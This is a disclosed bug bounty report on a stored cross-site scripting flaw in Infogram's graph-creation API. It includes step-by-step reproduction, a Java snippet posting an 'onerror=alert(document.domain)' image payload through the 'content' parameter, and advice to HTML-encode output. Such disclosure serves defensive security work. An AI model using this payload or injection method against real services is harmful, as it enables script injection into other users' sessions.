# Stored XSS in content when Graph is created via API

## Report Details
- **Report ID**: 287562
- **URL**: https://hackerone.com/reports/287562
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-11-05T13:35:29.891Z
- **Disclosed**: 2017-11-07T09:32:34.044Z

## Reporter
- **Username**: krankopwnz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
#Summary
It is possible for an attacker to insert javascript code into Graphs by creating a project via the API

#Steps to reproduce
Login
Go to [API Settings](https://infogram.com/app/#settings/api)
Copy your Key + Secret
Go to [API Documentation](https://developers.infogr.am/rest/)
Download one of the official libraries ( I chose JAVA )
In the "main" method add the Key + Secret you copied previously
Add a new parameter "content" with the following content:

`[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]`

Add all the other required parameters
My main method looks like this:
```
public static void main(String[] args) {
        InfogramAPI infogram = new InfogramAPI([API-Key], [API-Secret]);

        Map<String, String> parameters = new HashMap<String, String>();

        //parameters = null;

        parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]");
        parameters.put("theme_id", "7291");
        parameters.put("title","title");
        parameters.put("publish", "true");
        parameters.put("publish_mode", "public");
        
        try {
            Response response = infogram.sendRequest("POST", "infographics", parameters);

            if (response.isSuccessful()) {
                InputStream is = response.getResponseBody();
                System.out.print(getStringFromInputStream(is).replace(",", ",\n"));
                
            } else {
                String errmsg = String.format("The server returned %d %s", response.getHttpStatusCode(), response.getHttpStatusMessage());
                System.err.println(errmsg);
            }
        } catch (IOException e) {
            System.err.println("There was a problem connecting to the server");
            e.printStackTrace();
        }
    }
```

You will get a 201 response which indicates that the Graph has been successfully created
Now go to your [Dashboard](https://infogram.com/app/#/library)
Open the newly created project
A Javascript popup showing the current domain appears

{F236727}

#Remediation
HTML encode all parameter values before reflecting them on the page

## Attachments
- storedXSS-api.PNG
